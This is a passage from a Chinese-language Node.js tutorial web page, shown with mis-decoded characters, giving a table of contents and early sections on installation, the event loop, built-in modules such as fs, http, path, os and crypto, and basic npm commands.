è¿›è¡Œæ•°æ®å»ºæ¨¡</a></li></ul></li><li><p><a href="#52-%E4%BD%BF%E7%94%A8-mysql">5.2 ä½¿ç”¨ MySQL</a></p><ul><li><a href="#521-%E8%BF%9E%E6%8E%A5%E5%88%B0-mysql">5.2.1 è¿æ¥åˆ° MySQL</a></li><li><a href="#522-%E6%89%A7%E8%A1%8C-sql-%E6%9F%A5%E8%AF%A2">5.2.2 æ‰§è¡Œ SQL æŸ¥è¯¢</a></li><li><a href="#523-%E4%BD%BF%E7%94%A8-sequelize-%E8%BF%9B%E8%A1%8C-orm-%E6%98%A0%E5%B0%84">5.2.3 ä½¿ç”¨ <code>sequelize</code> è¿›è¡Œ ORM æ˜ å°„</a></li></ul></li></ul><h2 id="6-Web-å¼€å‘ä¸æ¡†æ¶"><a href="#6-Web-å¼€å‘ä¸æ¡†æ¶" class="headerlink" title="6. Web å¼€å‘ä¸æ¡†æ¶"></a>6. Web å¼€å‘ä¸æ¡†æ¶</h2><ul><li><p><a href="#61-%E4%BD%BF%E7%94%A8-express-%E6%A1%86%E6%9E%B6">6.1 ä½¿ç”¨ Express æ¡†æ¶</a></p><ul><li><a href="#611-%E5%88%9B%E5%BB%BA%E5%9F%BA%E6%9C%AC%E7%9A%84-express-%E5%BA%94%E7%94%A8">6.1.1 åˆ›å»ºåŸºæœ¬çš„ Express åº”ç”¨</a></li><li><a href="#612-%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6">6.1.2 è·¯ç”±ä¸ä¸­é—´ä»¶</a></li><li><a href="#613-%E5%A4%84%E7%90%86%E8%A1%A8%E5%8D%95%E5%92%8C-json-%E6%95%B0%E6%8D%AE">6.1.3 å¤„ç†è¡¨å•å’Œ JSON æ•°æ®</a></li><li><a href="#614-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">6.1.4 é”™è¯¯å¤„ç†</a></li></ul></li><li><p><a href="#62-%E4%BD%BF%E7%94%A8-koa-%E6%A1%86%E6%9E%B6">6.2 ä½¿ç”¨ Koa æ¡†æ¶</a></p><ul><li><a href="#621-koa-%E7%9A%84%E7%89%B9%E7%82%B9%E4%B8%8E-express-%E5%AF%B9%E6%AF%94">6.2.1 Koa çš„ç‰¹ç‚¹ä¸ Express å¯¹æ¯”</a></li><li><a href="#622-%E5%88%9B%E5%BB%BA-koa-%E5%BA%94%E7%94%A8">6.2.2 åˆ›å»º Koa åº”ç”¨</a></li><li><a href="#623-%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%A4%84%E7%90%86">6.2.3 ä¸­é—´ä»¶ä¸è·¯ç”±å¤„ç†</a></li></ul></li><li><p><a href="#63-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E">6.3 æ¨¡æ¿å¼•æ“</a></p><ul><li><a href="#631-%E4%BD%BF%E7%94%A8-ejs">6.3.1 ä½¿ç”¨ EJS</a></li><li><a href="#632-%E4%BD%BF%E7%94%A8-handlebars">6.3.2 ä½¿ç”¨ Handlebars</a></li><li><a href="#633-%E4%BD%BF%E7%94%A8-pug">6.3.3 ä½¿ç”¨ Pug</a></li></ul></li></ul><h2 id="7-æµ‹è¯•ä¸è°ƒè¯•"><a href="#7-æµ‹è¯•ä¸è°ƒè¯•" class="headerlink" title="7. æµ‹è¯•ä¸è°ƒè¯•"></a>7. æµ‹è¯•ä¸è°ƒè¯•</h2><ul><li><p><a href="#71-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E4%B8%8E%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95">7.1 å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•</a></p><ul><li><a href="#711-%E4%BD%BF%E7%94%A8-mocha-%E8%BF%9B%E8%A1%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95">7.1.1 ä½¿ç”¨ Mocha è¿›è¡Œå•å…ƒæµ‹è¯•</a></li><li><a href="#712-%E4%BD%BF%E7%94%A8-chai-%E8%BF%9B%E8%A1%8C%E6%96%AD%E8%A8%80">7.1.2 ä½¿ç”¨ Chai è¿›è¡Œæ–­è¨€</a></li><li><a href="#713-%E6%B5%8B%E8%AF%95%E5%BC%82%E6%AD%A5%E4%BB%A3%E7%A0%81">7.1.3 æµ‹è¯•å¼‚æ­¥ä»£ç </a></li></ul></li><li><p><a href="#72-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2 è°ƒè¯• Node.js åº”ç”¨</a></p><ul><li><a href="#721-%E4%BD%BF%E7%94%A8-consolelog-%E8%B0%83%E8%AF%95">7.2.1 ä½¿ç”¨ <code>console.log</code> è°ƒè¯•</a></li><li><a href="#722-%E4%BD%BF%E7%94%A8-nodejs-%E5%86%85%E7%BD%AE%E8%B0%83%E8%AF%95%E5%99%A8">7.2.2 ä½¿ç”¨ <code>Node.js</code> å†…ç½®è°ƒè¯•å™¨</a></li><li><a href="#723-%E4%BD%BF%E7%94%A8-vs-code-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2.3 ä½¿ç”¨ <code>VS Code</code> è°ƒè¯• Node.js åº”ç”¨</a></li></ul></li></ul><h2 id="8-éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–"><a href="#8-éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="8. éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–"></a>8. éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–</h2><ul><li><p><a href="#81-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1 éƒ¨ç½² Node.js åº”ç”¨</a></p><ul><li><a href="#811-%E4%BD%BF%E7%94%A8-pm2-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86">8.1.1 ä½¿ç”¨ <code>PM2</code> è¿›è¡Œè¿›ç¨‹ç®¡ç†</a></li><li><a href="#812-docker-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1.2 Docker éƒ¨ç½² Node.js åº”ç”¨</a></li><li><a href="#813-%E5%9C%A8%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B8%8A%E9%83%A8%E7%BD%B2-nodejs">8.1.3 åœ¨äº‘å¹³å°ä¸Šéƒ¨ç½² Node.js</a></li></ul></li><li><p><a href="#82-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BC%93%E5%AD%98">8.2 æ€§èƒ½ä¼˜åŒ–ä¸ç¼“å­˜</a></p><ul><li><a href="#821-%E4%BD%BF%E7%94%A8-redis-%E7%BC%93%E5%AD%98">8.2.1 ä½¿ç”¨ Redis ç¼“å­˜</a></li><li><a href="#822-%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E4%B8%8E%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">8.2.2 å†…å­˜ä¼˜åŒ–ä¸åƒåœ¾å›æ”¶</a></li><li><a href="#823-%E4%BD%BF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD">8.2.3 ä½¿ç”¨é›†ç¾¤æ¨¡å¼æé«˜æ€§èƒ½</a></li></ul></li></ul><h2 id="9-å®‰å…¨æ€§"><a href="#9-å®‰å…¨æ€§" class="headerlink" title="9. å®‰å…¨æ€§"></a>9. å®‰å…¨æ€§</h2><ul><li><p><a href="#91-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">9.1 å®‰å…¨æ€§æœ€ä½³å®è·µ</a></p><ul><li><a href="#911-%E9%98%B2%E6%AD%A2%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">9.1.1 é˜²æ­¢æ³¨å…¥æ”»å‡»</a></li><li><a href="#912-%E9%98%B2%E6%AD%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss">9.1.2 é˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡» (XSS)</a></li><li><a href="#913-%E4%BD%BF%E7%94%A8-helmetjs-%E4%BF%9D%E6%8A%A4%E5%BA%94%E7%94%A8">9.1.3 ä½¿ç”¨ <code>helmet.js</code> ä¿æŠ¤åº”ç”¨</a></li></ul></li><li><p><a href="#92-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83">9.2 èº«ä»½éªŒè¯ä¸æˆæƒ</a></p><ul><li><a href="#921-%E4%BD%BF%E7%94%A8-jwt-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">9.2.1 ä½¿ç”¨ JWT è¿›è¡Œèº«ä»½éªŒè¯</a></li><li><a href="#922-oauth-%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E9%9B%86%E6%88%90">9.2.2 OAuth ä¸ç¬¬ä¸‰æ–¹ç™»å½•é›†æˆ</a></li></ul></li><li><p><a href="#93-ssl-%E4%B8%8E-https">9.3 SSL ä¸ HTTPS</a></p><ul><li><a href="#931-%E7%94%9F%E6%88%90%E4%B8%8E%E9%85%8D%E7%BD%AE-ssl-%E8%AF%81%E4%B9%A6">9.3.1 ç”Ÿæˆä¸é…ç½® SSL è¯ä¹¦</a></li><li><a href="#932-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97">9.3.2 ä½¿ç”¨ <code>https</code> æ¨¡å—</a></li></ul></li></ul><h2 id="10-å®æˆ˜é¡¹ç›®"><a href="#10-å®æˆ˜é¡¹ç›®" class="headerlink" title="10. å®æˆ˜é¡¹ç›®"></a>10. å®æˆ˜é¡¹ç›®</h2><ul><li><p><a href="#101-%E6%9E%84%E5%BB%BA-restful-api">10.1 æ„å»º RESTful API</a></p><ul><li><a href="#1011-restful-api-%E5%9F%BA%E7%A1%80">10.1.1 RESTful API åŸºç¡€</a></li><li><a href="#1012-%E4%BD%BF%E7%94%A8-express-%E6%9E%84%E5%BB%BA-api">10.1.2 ä½¿ç”¨ Express æ„å»º API</a></li></ul></li><li><p><a href="#102-%E5%AE%9E%E7%8E%B0-websocket-%E9%80%9A%E4%BF%A1">10.2 å®ç° WebSocket é€šä¿¡</a></p><ul><li><a href="#1021-websocket-%E5%9F%BA%E7%A1%80">10.2.1 WebSocket åŸºç¡€</a></li><li><a href="#1022-%E4%BD%BF%E7%94%A8-ws-%E5%AE%9E%E7%8E%B0-websocket-%E6%9C%8D%E5%8A%A1">10.2.2 ä½¿ç”¨ <code>ws</code> å®ç° WebSocket æœåŠ¡</a></li></ul></li><li><p><a href="#103-%E4%BD%BF%E7%94%A8-graphql-%E6%9E%84%E5%BB%BA-api">10.3 ä½¿ç”¨ GraphQL æ„å»º API</a></p><ul><li><p><a href="#1031-graphql-%E6%A6%82%E8%BF%B0">10.3.1 GraphQL æ¦‚è¿°</a></p></li><li><p><a href="#1032-%E4%BD%BF%E7%94%A8-apollo-server-%E6%9E%84%E5%BB%BA-graphql-api">10.3.2 ä½¿ç”¨ Apollo Server æ„å»º GraphQL API</a></p></li></ul></li></ul><h3 id="1-1-ä»€ä¹ˆæ˜¯-Node-js"><a href="#1-1-ä»€ä¹ˆæ˜¯-Node-js" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯ Node.js"></a>1.1 ä»€ä¹ˆæ˜¯ Node.js</h3><p>Node.js æ˜¯ä¸€ä¸ªåŸºäº <strong>Chrome V8 JavaScript å¼•æ“</strong> æ„å»ºçš„ JavaScript è¿è¡Œç¯å¢ƒã€‚å®ƒå…è®¸å¼€å‘è€…ä½¿ç”¨ JavaScript ç¼–å†™åç«¯ä»£ç ï¼Œå› æ­¤å‰åç«¯å¯ä»¥å…±äº«åŒä¸€ç§è¯­è¨€ã€‚Node.js ä¸»è¦ç”¨äºå¼€å‘ç½‘ç»œæœåŠ¡å™¨ã€å®æ—¶åº”ç”¨ç¨‹åºã€å‘½ä»¤è¡Œå·¥å…·ç­‰ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šNode.js çš„äº‹ä»¶é©±åŠ¨æ¶æ„ä½¿å…¶èƒ½å¤Ÿé«˜æ•ˆåœ°å¤„ç†å¹¶å‘è¿æ¥ã€‚</li><li><strong>å¼‚æ­¥éé˜»å¡ I&#x2F;O</strong>ï¼šé€šè¿‡å¼‚æ­¥å¤„ç†ï¼ŒNode.js å¯ä»¥åœ¨ä¸é˜»å¡ç¨‹åºæ‰§è¡Œçš„æƒ…å†µä¸‹å¤„ç† I&#x2F;O æ“ä½œï¼ˆæ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œè¯·æ±‚ç­‰ï¼‰ã€‚</li><li><strong>å•çº¿ç¨‹æ¨¡å‹</strong>ï¼šå°½ç®¡ Node.js æ˜¯å•çº¿ç¨‹çš„ï¼Œä½†å®ƒé€šè¿‡äº‹ä»¶å¾ªç¯å’Œå¼‚æ­¥ç¼–ç¨‹æ”¯æŒé«˜å¹¶å‘å¤„ç†ã€‚</li></ul><h3 id="1-2-Node-js-å®‰è£…ä¸é…ç½®"><a href="#1-2-Node-js-å®‰è£…ä¸é…ç½®" class="headerlink" title="1.2 Node.js å®‰è£…ä¸é…ç½®"></a>1.2 Node.js å®‰è£…ä¸é…ç½®</h3><h4 id="1-2-1-åœ¨ä¸åŒå¹³å°ä¸Šå®‰è£…-Node-js"><a href="#1-2-1-åœ¨ä¸åŒå¹³å°ä¸Šå®‰è£…-Node-js" class="headerlink" title="1.2.1 åœ¨ä¸åŒå¹³å°ä¸Šå®‰è£… Node.js"></a>1.2.1 åœ¨ä¸åŒå¹³å°ä¸Šå®‰è£… Node.js</h4><ul><li><strong>Windows</strong>ï¼šè®¿é—® <a href="https://nodejs.org/">Node.js å®˜ç½‘</a> ä¸‹è½½é€‚åˆä½ çš„å®‰è£…åŒ…ï¼Œå¹¶è¿è¡Œå®‰è£…ç¨‹åºã€‚</li><li><strong>macOS</strong>ï¼šä½¿ç”¨ Homebrew å®‰è£…ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install node<br></code></pre></td></tr></table></figure></li><li><strong>Linux</strong>ï¼šé€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-2-éªŒè¯å®‰è£…"><a href="#1-2-2-éªŒè¯å®‰è£…" class="headerlink" title="1.2.2 éªŒè¯å®‰è£…"></a>1.2.2 éªŒè¯å®‰è£…</h4><p>åœ¨ç»ˆç«¯ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç¡®ä¿ Node.js å’Œ npm å®‰è£…æˆåŠŸï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure><h3 id="1-3-Node-js-è¿è¡Œæœºåˆ¶ä¸äº‹ä»¶å¾ªç¯"><a href="#1-3-Node-js-è¿è¡Œæœºåˆ¶ä¸äº‹ä»¶å¾ªç¯" class="headerlink" title="1.3 Node.js è¿è¡Œæœºåˆ¶ä¸äº‹ä»¶å¾ªç¯"></a>1.3 Node.js è¿è¡Œæœºåˆ¶ä¸äº‹ä»¶å¾ªç¯</h3><p>Node.js ä½¿ç”¨ <strong>äº‹ä»¶é©±åŠ¨</strong> å’Œ <strong>éé˜»å¡ I&#x2F;O æ¨¡å‹</strong> æ¥å¤„ç†é«˜å¹¶å‘ã€‚å®ƒåŸºäº <strong>å•çº¿ç¨‹</strong> å¤„ç†æ‰€æœ‰çš„è¯·æ±‚ï¼Œé€šè¿‡äº‹ä»¶å¾ªç¯ç®¡ç†å¼‚æ­¥æ“ä½œã€‚</p><h4 id="1-3-1-äº‹ä»¶å¾ªç¯çš„å·¥ä½œåŸç†"><a href="#1-3-1-äº‹ä»¶å¾ªç¯çš„å·¥ä½œåŸç†" class="headerlink" title="1.3.1 äº‹ä»¶å¾ªç¯çš„å·¥ä½œåŸç†"></a>1.3.1 äº‹ä»¶å¾ªç¯çš„å·¥ä½œåŸç†</h4><p>äº‹ä»¶å¾ªç¯æ˜¯ Node.js çš„æ ¸å¿ƒï¼Œå®ƒå…è®¸ Node.js å¤„ç†å¼‚æ­¥ I&#x2F;O æ“ä½œè€Œä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚æ¯æ¬¡å¼‚æ­¥æ“ä½œè¢«æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ä¸­ï¼Œå½“ I&#x2F;O æ“ä½œå®Œæˆæ—¶ï¼Œç›¸å…³çš„å›è°ƒå‡½æ•°ä¼šè¢«æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰å¾…äº‹ä»¶å¾ªç¯è°ƒåº¦æ‰§è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Inside Timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;End&#x27;</span>);<br><br><span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼š</span><br><span class="hljs-comment">// Start</span><br><span class="hljs-comment">// End</span><br><span class="hljs-comment">// Inside Timeout</span><br></code></pre></td></tr></table></figure><h3 id="1-4-Node-js-ä¸-JavaScript-çš„åŒºåˆ«"><a href="#1-4-Node-js-ä¸-JavaScript-çš„åŒºåˆ«" class="headerlink" title="1.4 Node.js ä¸ JavaScript çš„åŒºåˆ«"></a>1.4 Node.js ä¸ JavaScript çš„åŒºåˆ«</h3><p>Node.js å’Œ JavaScript éƒ½ä½¿ç”¨åŒæ ·çš„è¯­è¨€è¯­æ³•ï¼Œä½†å®ƒä»¬çš„è¿è¡Œç¯å¢ƒå’Œä½¿ç”¨åœºæ™¯ä¸åŒï¼š</p><ul><li><strong>JavaScript</strong> ä¸»è¦è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œç”¨äºæ“æ§ DOM å’Œå¤„ç†å‰ç«¯äº¤äº’ã€‚</li><li><strong>Node.js</strong> è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨äºæ„å»ºåç«¯åº”ç”¨ç¨‹åºå’Œå¤„ç† I&#x2F;O æ“ä½œã€‚</li></ul><p>Node.js æä¾›äº†è®¸å¤š JavaScript åœ¨æµè§ˆå™¨ä¸­æ²¡æœ‰çš„æ¨¡å—ï¼Œå¦‚ <code>fs</code> (æ–‡ä»¶ç³»ç»Ÿæ¨¡å—)ã€<code>http</code> (HTTP æ¨¡å—)ã€<code>net</code> (ç½‘ç»œæ¨¡å—) ç­‰ã€‚</p><hr><h2 id="2-æ¨¡å—ä¸åŒ…ç®¡ç†-1"><a href="#2-æ¨¡å—ä¸åŒ…ç®¡ç†-1" class="headerlink" title="2. æ¨¡å—ä¸åŒ…ç®¡ç†"></a>2. æ¨¡å—ä¸åŒ…ç®¡ç†</h2><h3 id="2-1-Node-js-å†…ç½®æ¨¡å—"><a href="#2-1-Node-js-å†…ç½®æ¨¡å—" class="headerlink" title="2.1 Node.js å†…ç½®æ¨¡å—"></a>2.1 Node.js å†…ç½®æ¨¡å—</h3><p>Node.js æä¾›äº†ä¸€ç³»åˆ—å†…ç½®æ¨¡å—ï¼Œå…è®¸å¼€å‘è€…å¤„ç†å¸¸è§çš„ä»»åŠ¡ï¼Œå¦‚æ–‡ä»¶æ“ä½œã€ç½‘ç»œè¯·æ±‚ç­‰ã€‚</p><h4 id="2-1-1-fs-æ–‡ä»¶ç³»ç»Ÿæ¨¡å—"><a href="#2-1-1-fs-æ–‡ä»¶ç³»ç»Ÿæ¨¡å—" class="headerlink" title="2.1.1 fs æ–‡ä»¶ç³»ç»Ÿæ¨¡å—"></a>2.1.1 <code>fs</code> æ–‡ä»¶ç³»ç»Ÿæ¨¡å—</h4><p><code>fs</code> æ¨¡å—ç”¨äºå¤„ç†æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œï¼ŒåŒ…æ‹¬è¯»å–ã€å†™å…¥æ–‡ä»¶å’Œç®¡ç†æ–‡ä»¶å¤¹ã€‚</p><p><strong>è¯»å–æ–‡ä»¶ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-2-http-æ¨¡å—"><a href="#2-1-2-http-æ¨¡å—" class="headerlink" title="2.1.2 http æ¨¡å—"></a>2.1.2 <code>http</code> æ¨¡å—</h4><p><code>http</code> æ¨¡å—ç”¨äºåˆ›å»º HTTP æœåŠ¡å™¨å’Œå¤„ç†è¯·æ±‚&#x2F;å“åº”ã€‚</p><p><strong>åˆ›å»ºç®€å•çš„ HTTP æœåŠ¡å™¨ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-3-path-æ¨¡å—"><a href="#2-1-3-path-æ¨¡å—" class="headerlink" title="2.1.3 path æ¨¡å—"></a>2.1.3 <code>path</code> æ¨¡å—</h4><p><code>path</code> æ¨¡å—ç”¨äºå¤„ç†å’Œè§„èŒƒåŒ–æ–‡ä»¶è·¯å¾„ã€‚</p><p><strong>è·å–æ–‡ä»¶çš„æ‰©å±•åï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> ext = path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ext); <span class="hljs-comment">// è¾“å‡º: .txt</span><br></code></pre></td></tr></table></figure><h4 id="2-1-4-os-æ¨¡å—"><a href="#2-1-4-os-æ¨¡å—" class="headerlink" title="2.1.4 os æ¨¡å—"></a>2.1.4 <code>os</code> æ¨¡å—</h4><p><code>os</code> æ¨¡å—æä¾›ä¸æ“ä½œç³»ç»Ÿç›¸å…³çš„å®ç”¨å‡½æ•°å’Œå±æ€§ã€‚</p><p><strong>è·å–ç³»ç»Ÿçš„å†…å­˜ä¿¡æ¯ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Total Memory: <span class="hljs-subst">$&#123;os.totalmem()&#125;</span> bytes`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Free Memory: <span class="hljs-subst">$&#123;os.freemem()&#125;</span> bytes`</span>);<br></code></pre></td></tr></table></figure><h4 id="2-1-5-crypto-æ¨¡å—"><a href="#2-1-5-crypto-æ¨¡å—" class="headerlink" title="2.1.5 crypto æ¨¡å—"></a>2.1.5 <code>crypto</code> æ¨¡å—</h4><p><code>crypto</code> æ¨¡å—æä¾›äº†åŠ å¯†æ“ä½œçš„åŠŸèƒ½ï¼Œç”¨äºç”Ÿæˆå“ˆå¸Œã€åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚</p><p><strong>ç”Ÿæˆ SHA256 å“ˆå¸Œï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash);<br></code></pre></td></tr></table></figure><h3 id="2-2-ä½¿ç”¨-NPM-å’ŒåŒ…ç®¡ç†"><a href="#2-2-ä½¿ç”¨-NPM-å’ŒåŒ…ç®¡ç†" class="headerlink" title="2.2 ä½¿ç”¨ NPM å’ŒåŒ…ç®¡ç†"></a>2.2 ä½¿ç”¨ NPM å’ŒåŒ…ç®¡ç†</h3><p>NPM æ˜¯ Node.js çš„åŒ…ç®¡ç†å™¨ï¼Œå…è®¸å¼€å‘è€…å®‰è£…ã€ç®¡ç†å’Œåˆ†äº«ç¬¬ä¸‰æ–¹åº“ã€‚</p><h4 id="2-2-1-NPM-çš„å®‰è£…å’Œä½¿ç”¨"><a href="#2-2-1-NPM-çš„å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="2.2.1 NPM çš„å®‰è£…å’Œä½¿ç”¨"></a>2.2.1 NPM çš„å®‰è£…å’Œä½¿ç”¨</h4><p>åœ¨å®‰è£… Node.js æ—¶ï¼ŒNPM ä¼šè‡ªåŠ¨å®‰è£…ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm -v<br></code></pre></td></tr></table></figure><h4 id="2-2-2-ç®¡ç†é¡¹ç›®ä¾èµ–"><a href="#2-2-2-ç®¡ç†é¡¹ç›®ä¾èµ–" class="headerlink" title="2.2.2 ç®¡ç†é¡¹ç›®ä¾èµ–"></a>2.2.2 ç®¡ç†é¡¹ç›®ä¾èµ–</h4><p><strong>å®‰è£…ä¾èµ–åŒ…ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>å¸è½½ä¾èµ–åŒ…ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 